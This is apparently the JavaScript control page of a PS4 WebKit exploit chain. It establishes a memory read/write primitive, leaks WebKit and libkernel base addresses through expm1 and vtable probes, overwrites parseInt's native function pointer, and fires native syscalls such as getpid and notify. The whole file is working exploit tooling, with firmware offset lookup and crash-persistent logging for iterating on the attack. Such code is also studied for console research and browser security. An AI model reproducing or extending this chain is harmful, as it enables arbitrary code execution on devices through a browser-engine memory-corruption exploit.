/** stub_call.js UI — crash-safe logs survive tab death. */
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { establishPrimitive, trimExploitDebris } from "./core.js?v=stub-core-4";
import { createCrashLog } from "./log_persist.js";
import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
import {
    persistSessionBases, saveLibkernelSession, saveLastFnPtr,
} from "./libkernel_resolve.js";
import {
    fireStubSwapParseInt, fireCollatorStub, pinCollatorStub,
    STUB_LAST_STEP_KEY, loadStubCap,
} from "./stub_call.js?v=stub-7";
import {
    fireG0Smoke, fireG0Getpid, fireG0Notify, disarmStubG0, resetG0Prep,
    g0AlreadyFired, nativeRetOk,
} from "./stub_g0_fire.js?v=stub-g0-2";

const BUILD = "stub-page-9";
const SS_SEQ_DONE = "wk-stub-seq-done";
const params = new URLSearchParams(location.search);
let lines = [], ready = false, busy = false, collatorPin = null;
const retain = [];

const crashLog = createCrashLog({
    ssLog: "wk-stub-log",
    ssState: "wk-stub-state",
    ssBuild: "wk-stub-build",
    buildId: BUILD,
    maxLines: 120,
    flushMs: 200,
    critical: /^(FAIL|ERROR|STUB|PRIMITIVE|BOOT|SKIP|FIRE|TRIM|PIN|2E|LK-)/,
});

function $(id) { return document.getElementById(id); }

function log(tag, d) {
    const line = tag + (d ? "  " + d : "");
    lines.push(line);
    if (lines.length > 120) lines.shift();
    crashLog.append(line, tag);
    const o = $("out");
    if (o) {
        o.textContent = lines.join("\n");
        o.scrollTop = o.scrollHeight;
    }
}

function flushLog() {
    crashLog.flushSync();
}

function state(msg, cls) {
    const s = $("state");
    if (s) { s.textContent = msg; s.className = cls || ""; }
    crashLog.persistState(msg, cls || "");
}

function parseAddr(raw) {
    if (!raw) return null;
    let s = String(raw).replace(/^0x/i, "").trim();
    if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function chainWebkitBase(off) {
    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
    const nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
    if (nativeFn && off.wk_expm1_builtin) {
        const derived = nativeFn.sub32(off.wk_expm1_builtin);
        if (derived) webkitBase = derived;
    }
    return webkitBase;
}

/** expm1 walk — same lightweight path as index_rw Start. */
function persistWebkitBasesLight(p, off) {
    if (!p || !off) return null;
    const cell = p.leakval(Math.expm1);
    const nativeFn = read8p(p, read8p(p, cell.add32(0x18))
        .add32(off.wk_JSFunction_m_function || 0x28));
    if (!nativeFn) return null;
    const webkitBase = off.wk_expm1_builtin
        ? nativeFn.sub32(off.wk_expm1_builtin)
        : null;
    persistSessionBases(nativeFn, webkitBase, { trust: "stub" });
    return webkitBase;
}

function fillLkInput(lk, fnPtr) {
    const hex = String(lk).replace(/^0x/i, "");
    const inp = $("lk-in");
    if (inp) inp.value = hex;
    try { sessionStorage.setItem("wk-libkernelBase", hex); } catch (_) { }
    if (fnPtr) saveLastFnPtr(fnPtr);
}

function onLkFoundHot(lk, hit) {
    fillLkInput(lk, hit && hit.fnPtr);
    saveLibkernelSession(lk, hit && hit.iatRva != null ? hit.iatRva : null, { forced: true });
    const via = hit ? (hit.method + "/" + hit.via) : "?";
    log("LK-OK", lk + " (" + via + ") — autofilled");
    log("LK-HOT", "reads=0 — Arm or Fire");
    state("lk hot — Arm / Fire", "ok");
    flushLog();
}

async function run2e(fromStart) {
    if (!ready || !window.p) return false;
    if (!fromStart && busy) return false;
    const p = window.p;
    const off = loadEffectiveOff();
    let webkitBase = chainWebkitBase(off);
    if (!webkitBase) {
        try {
            webkitBase = persistWebkitBasesLight(p, off);
            if (webkitBase) log("WEBKIT-BASE", String(webkitBase));
        } catch (e) {
            log("WEBKIT-BASE-WARN", e.message || String(e));
        }
    }
    if (!webkitBase) {
        log("LK-SKIP", "no webkitBase — Start first");
        state("Start first", "bad");
        flushLog();
        return false;
    }

    busy = true;
    const btn2e = $("btn-2e");
    if (btn2e) btn2e.disabled = true;
    log("2E-LK", BUILD + " — vtable leak + lk vote");
    flushLog();

    try {
        const vtslots = params.get("vtslots");
        const result = await probeLibkernelViaVtable({
            p: p,
            carrier: window._wkCarrier || null,
            webkitBase: webkitBase,
            off: off,
            log: log,
            read8: read8p,
            read4: read4p,
            yieldFn: function (ms) { return new Promise(function (r) { setTimeout(r, ms); }); },
            opts: {
                full: params.get("full") === "1",
                vtslots: vtslots ? parseInt(vtslots, 10) : undefined,
                retain: retain,
            },
        });
        if (result.ok && result.lk) {
            onLkFoundHot(result.lk, result.hit);
            return true;
        }
        log("LK-HINT", "miss — ?g=drain:512 or ?full=1, then 2e again");
        state("2e lk miss", "bad");
        flushLog();
        return false;
    } catch (e) {
        log("LK-FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
        state("2e error", "bad");
        flushLog();
        return false;
    } finally {
        busy = false;
        if (btn2e && ready) btn2e.disabled = false;
    }
}

function lkFromInput() {
    const raw = $("lk-in").value.trim();
    if (!raw) {
        try {
            const s = sessionStorage.getItem("wk-libkernelBase");
            if (s) return parseAddr(s);
        } catch (_) { }
        return null;
    }
    const p = parseAddr(raw);
    if (!p) return null;
    if ((p.low & 0x3fff) === 0 && p.hi >= 0x80) return p;
    return p.sub32(0x13b20);
}

function stubFireMode() {
    const q = params.get("stubfire") || "g0getpid";
    if (q === "g0getpid" || q === "g0notify") return q;
    return "g0getpid";
}

function lockFireAfterNative(msg) {
    const bf = $("btn-fire");
    if (bf) bf.disabled = true;
    state(msg || "native OK — reload tab", "ok");
}

function stubMode() {
    const q = params.get("stub");
    if (q === "collator" || q === "arm" || q === "fire") return q;
    return "parseint";
}

function stubOpts() {
    const cached = (typeof window !== "undefined" && window._stubCap) || loadStubCap();
    return {
        log: log,
        flush: flushLog,
        stubKind: params.get("stubkind") || "syscall",
        useTextarea: params.get("arg") === "ta",
        carrier: window._wkCarrier || null,
        retain: retain,
        reuseCap: cached,
        preTrim: function () {
            try { trimExploitDebris(); } catch (_) { }
        },
    };
}

function loadEffectiveOff() {
    const detected = offsetsFor(navigator.userAgent);
    if (!detected.off)
        throw new Error("unknown FW UA=" + (navigator.userAgent || "?").slice(0, 60));
    return detected.off;
}

function syncRadios() {
    const fm = stubFireMode();
    document.querySelectorAll('input[name="stubfire"]').forEach(function (el) {
        el.checked = el.value === fm;
    });
}

function showLastCrashStep() {
    try {
        const last = sessionStorage.getItem(STUB_LAST_STEP_KEY);
        if (last) log("LAST-CRASH-STEP", last);
        const prev = sessionStorage.getItem("wk-stub-log");
        if (prev) {
            lines = prev.split("\n").filter(Boolean).slice(-100);
            const o = $("out");
            if (o) o.textContent = lines.join("\n");
        }
    } catch (_) { }
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    log("BOOT", BUILD + " mode=" + stubMode());
    flushLog();
    try {
        const carrier = await establishPrimitive({
            maxAttempts: 0,
            skipTrimDebris: true,
            onEvent: (t, d) => {
                if (/PRIMITIVE|FAIL|ERROR|READ-PRIMITIVE|ATTEMPT/i.test(t)) {
                    log(t, d || "");
                    flushLog();
                }
            },
        });
        installWindowP(carrier, { promote: false });
        window._wkCarrier = carrier;
        if (!window.p) throw new Error("no window.p");
        try { trimExploitDebris(); log("TRIM", "ok"); } catch (_) { }
        if (pairStatus.state === "broken") throw new Error("pair broken");
        if (!carrier.textarea) throw new Error("no carrier.textarea");
        log("PRIMITIVE-OK", "ta=0x" + (carrier.textareaAddress || "?")
            + " nativeFn=0x" + (carrier.native && carrier.native.nativeFn || "?")
            + " exec=0x" + (carrier.native && carrier.native.executable || "?"));
        if (stubMode() === "collator") {
            collatorPin = pinCollatorStub(retain);
            log("PIN-OK", "collator arena");
        }
        ready = true;
        $("btn-fire").disabled = false;
        $("btn-arm").disabled = false;
        if ($("btn-2e")) $("btn-2e").disabled = false;
        if ($("btn-sequence")) $("btn-sequence").disabled = false;
        try {
            const wb = persistWebkitBasesLight(window.p, loadEffectiveOff());
            if (wb) log("WEBKIT-BASE", "saved " + wb);
        } catch (_) { }
        state("ready — 2e Leak+lk", "ok");
        flushLog();
        if (params.get("noauto2e") !== "1") {
            await run2e(true);
        }
    } catch (e) {
        log("FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
        state("Start failed", "bad");
        flushLog();
    } finally {
        busy = false;
    }
}

function seqDone() {
    if (window._stubSeqDone) return true;
    try { return sessionStorage.getItem(SS_SEQ_DONE) === "1"; } catch (_) { return false; }
}

function markSeqDone() {
    window._stubSeqDone = true;
    try { sessionStorage.setItem(SS_SEQ_DONE, "1"); } catch (_) { }
}

/** HW sequence: arm → g0 smoke → parseInt g0 smoke. Then Fire getpid or notify. */
async function runMainSequence() {
    if (busy || !ready || !window.p) return;
    const lk = lkFromInput();
    if (!lk) {
        log("SKIP", "need lk — 2e first");
        state("need lk", "bad");
        flushLog();
        return;
    }
    busy = true;
    const btn = $("btn-sequence");
    if (btn) btn.disabled = true;
    log("SEQ-START", "1 arm → 2 g0 smoke → 3 parseInt g0 smoke");
    flushLog();
    try {
        const p = window.p;
        const off = loadEffectiveOff();
        const opts = stubOpts();

        log("SEQ-1", "arm (verify write, restore parseInt)");
        const arm = fireStubSwapParseInt(p, off, lk, Object.assign({}, opts, { armOnly: true }));
        window._stubCap = {
            mainMf: arm.mainMf,
            mainOrig: arm.mainOrig,
            nativeFn: arm.mainOrig,
            path: "armed",
        };
        flushLog();

        log("SEQ-2", "g0 smoke parseInt(1) no hook");
        fireG0Smoke(p, off, opts);
        flushLog();

        log("SEQ-3", "parseInt g0 smoke parseInt(1) no hook");
        fireG0Smoke(p, off, opts);
        flushLog();

        markSeqDone();
        log("SEQ-OK", "prep done — select getpid or notify → Fire");
        state("sequence OK — Fire getpid or notify", "ok");
    } catch (e) {
        log("SEQ-FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
        state("sequence failed", "bad");
    } finally {
        busy = false;
        if (btn && ready) btn.disabled = false;
        flushLog();
    }
}

function runArm() {
    if (busy || !ready || !window.p) return;
    const lk = lkFromInput();
    if (!lk) { log("SKIP", "paste lk"); state("need lk", "bad"); flushLog(); return; }
    busy = true;
    try {
        const off = loadEffectiveOff();
        log("ARM-TAP", "lk=" + lk);
        const r = fireStubSwapParseInt(window.p, off, lk, Object.assign({}, stubOpts(), { armOnly: true }));
        window._stubCap = { mainMf: r.mainMf, mainOrig: r.mainOrig, nativeFn: r.mainOrig, path: "armed" };
        log("ARM-OK", r.stubTag + " mainMf=" + r.mainMf + " — parseInt restored");
        state("arm OK — Fire uses parseInt(1)", "ok");
    } catch (e) {
        log("ARM-FAIL", e.message || String(e));
        state("arm failed", "bad");
    } finally {
        busy = false;
        flushLog();
    }
}

function runFire() {
    if (busy || !ready || !window.p) return;
    const fireMode = stubFireMode();
    const lk = lkFromInput();
    if (!lk) {
        log("SKIP", "need lk — 2e first");
        state("need lk", "bad");
        flushLog();
        return;
    }
    if (!seqDone()) {
        log("SEQ-HINT", "run Prep sequence first (arm → g0 smoke ×2)");
        state("run Prep sequence first", "warn");
        flushLog();
        return;
    }
    busy = true;
    log("FIRE-TAP", fireMode + " lk=" + lk);
    flushLog();
    try {
        const p = window.p;
        const off = loadEffectiveOff();
        const opts = stubOpts();
        if (fireMode === "g0getpid") {
            const r = fireG0Getpid(p, off, lk, opts);
            log("NATIVE-OK", "getpid errno=" + r.errno + (r.ok ? " — SUCCESS" : " — fail"));
            lockFireAfterNative(r.ok ? "getpid errno=0 OK" : "getpid errno=" + r.errno);
            return;
        }
        if (fireMode === "g0notify") {
            const r = fireG0Notify(p, off, lk, opts);
            log("NATIVE-OK", "notify errno=" + r.errno + (r.ok ? " — check toast" : " fail"));
            lockFireAfterNative(r.ok ? "notify sent — check toast" : "notify errno=" + r.errno);
            return;
        }
        log("STUB-FAIL", "pick getpid or notify");
        state("select getpid or notify", "warn");
    } catch (e) {
        log("STUB-FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
        state("failed @ " + (sessionStorage.getItem(STUB_LAST_STEP_KEY) || "?"), "bad");
    } finally {
        busy = false;
        flushLog();
    }
}

function init() {
    crashLog.startAutoFlush();
    showLastCrashStep();
    log("INIT", BUILD + " — Start → 2e → Prep sequence → Fire (getpid|notify)");
    if (seqDone()) log("SEQ-OK", "restored — pick getpid/notify → Fire");
    if (g0AlreadyFired()) {
        log("NATIVE-OK", "restored — native fired OK (reload tab to retry)");
        lockFireAfterNative("native OK — reload tab");
    }
    flushLog();
    syncRadios();
    document.querySelectorAll('input[name="stubfire"]').forEach(function (el) {
        el.addEventListener("change", function () {
            const u = new URL(location.href);
            u.searchParams.set("stubfire", el.value);
            location.href = u.pathname + "?" + u.searchParams.toString();
        });
    });
    window.addEventListener("beforeunload", function () {
        try {
            if (window.p) disarmStubG0(window.p);
        } catch (_) { }
        crashLog.flushSync();
    });
    $("btn-start").onclick = runStart;
    $("btn-2e").onclick = function () { run2e(); };
    $("btn-sequence").onclick = function () { runMainSequence(); };
    $("btn-arm").onclick = runArm;
    $("btn-fire").onclick = runFire;
    const saved = sessionStorage.getItem("wk-libkernelBase") || sessionStorage.getItem("wk-lastFnPtr");
    if (saved) $("lk-in").value = saved;
}

init();
